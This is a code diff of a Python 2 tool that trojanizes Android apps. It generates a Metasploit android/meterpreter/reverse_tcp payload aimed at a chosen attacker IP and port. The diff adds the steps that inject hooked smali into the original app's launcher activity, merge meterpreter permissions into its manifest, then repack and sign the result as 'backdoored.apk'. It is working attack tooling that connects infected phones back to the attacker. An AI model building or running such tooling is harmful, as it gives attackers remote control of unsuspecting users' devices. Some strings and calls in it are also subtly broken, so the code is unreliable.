@@ -2,10 +2,14 @@
 import subprocess
 import argparse
 import sys
+import errno
 import os
+import shutil
+
 import xml.etree.ElementTree as ET
 
-from apkhandling import builder
+from apkhandling import builder, manifest_analyzer
+from apkhandling import smali_converter
 
 # tasks:
 # - write/include argument parser
@@ -30,18 +34,13 @@ from apkhandling import builder
 # - method that signs the apk
 
 # global dictonary for the arguments
-args={}
+args = {}
 
-def findlauncheractivity(manifest):
-    pass # TODO
-
-def scrapeFilesForLauncherActivity():
-    pass # TODO
 
 def parseArgs():
     global args
     parser = argparse.ArgumentParser(description="")
-    parser.add_argument("-o", "--original", action="store", dest="original_apk" , default="")
+    parser.add_argument("-o", "--original", action="store", dest="original_apk", default="")
     parser.add_argument("-m", "--malware", action="store", dest="malware_apk", default="")
     parser.add_argument("-out", "--output", action="store", dest="output_dir", default="")
     parser.add_argument("--meterpreter_ip", action="store", dest="meterpreter_ip", default="")
@@ -57,7 +56,8 @@ def parseArgs():
         args['metasploit_used'] = True
         # always android reverse shell and alway same output file
         args['meterpreter_arguments'] = "-p android/meterpreter/reverse_tcp LHOST=" + str(args['meterpreter_ip']) + \
-         " LPORT=" + str(args['meterpreter_port']) + " -o payload.apk"
+                                        " LPORT=" + str(args['meterpreter_port']) + " -o payload.apk"
+
 
 # checks if a given program is installed on the computer
 # Returns True or False
@@ -74,26 +74,20 @@ def run_meterpreter(command):
     (out, err) = proc.communicate()
 
     if "invalid" in out.lower() or \
-        "error" in out.lower():
+            "error" in out.lower():
         print out
         sys.exit(1)
+
 
 def run_jarsigner(command):
     """ executes the jarsigner with specific options 
         given in the 'command' argument"""
-    full_command = "jarsigner "+command
+    full_command = "jarsigner " + command
     proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
     (out, err) = proc.communicate()
     print out
     print err
 
-
-def find_launcher_activity(root):
-    """
-        Finds the launcher activity from the 
-        XML.Tree root element given as parameter.
-    """
-    # TODO
 
 def main():
     global args
@@ -116,22 +110,22 @@ def main():
     if not args['metasploit_used']:
         print "metasploit is required to run application, please activate metasploit"
         sys.exit(1)
-    
-    
+
     print "[*] Generating msfvenom payload..\n"
     print "Metasploit command: msfvenom -f raw {} -o payload.apk 2>&1\n" \
         .format(args['meterpreter_arguments'])
 
-    command = "msfvenom "+ args['meterpreter_arguments'] + " 2>&1"
+    command = "msfvenom " + args['meterpreter_arguments'] + " 2>&1"
     print str(command)
 
     run_meterpreter(command)
 
     print "[*] Signing payload..\n"
-    run_jarsigner("-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA payload.apk androiddebugkey")
+    run_jarsigner(
+        "-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA payload.apk androiddebugkey")
 
     print "[*] Copy apk to desired place..\n"
-    proc = subprocess.Popen("cp "+args['original_apk']+" original.apk", stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("cp " + args['original_apk'] + " original.apk", stdout=subprocess.PIPE, shell=True)
     (out, err) = proc.communicate()
     print out
 
@@ -142,8 +136,44 @@ def main():
 
     # read the manifest to xml model
     print "Reading android manifest"
-    tree = ET.parse('original/AndroidManifest.xml')
-    root = tree.getroot()
 
-    launcher_activity  = find_launcher_activity(root)
+    launcher_activity = manifest_analyzer.find_launcher_activity('original/_decompiled/AndroidManifest.xml')
+    print "[*] Launcheractivity: {} ".format(launcher_activity[0])
+
+    smali_file = 'original/_decompiled/smali/{}.smali'.format(launcher_activity[0].replace(".", "/"))
+
+    print smali_file
+
+    print "[*] Copying payload files..\n"
+    hookedsmali = smali_converter.generate_hooked_smali(smali_file)
+    print "[*] Loading ", smali_file, " and injecting payload..\n"
+
+    with open(smali_file, "w") as f:
+        f.write("\n".join(hookedsmali))
+    injected_apk = "backdoored.apk"
+
+    print "[*] Poisoning the manifest with meterpreter permissions..\n"
+    payload_manifest = "payload/_decompiled/AndroidManifest.xml"
+    original_manifest = "original/_decompiled/AndroidManifest.xml"
+    manifest_analyzer.fix_manifest(payload_manifest, original_manifest, original_manifest)
+
+    print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"
+
+    builder.repackApk("original/_decompiled/")
+    print "[*] Signing #{injected_apk} ..\n"
+
+    run_jarsigner(
+        "-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg "
+        "MD5withRSA " + injected_apk + " androiddebugkey")
+
+    # clean up
+    print "[*] Clean up intermediate state ..\n"
+    shutil.rmtree('original/')
+    shutil.rmtree('payload/')
+
+    os.remove("original.apk")
+    os.remove("payload.apk")
+    print "[+] Infected file " + injected_apk + " ready.\n"
+
+
 main()
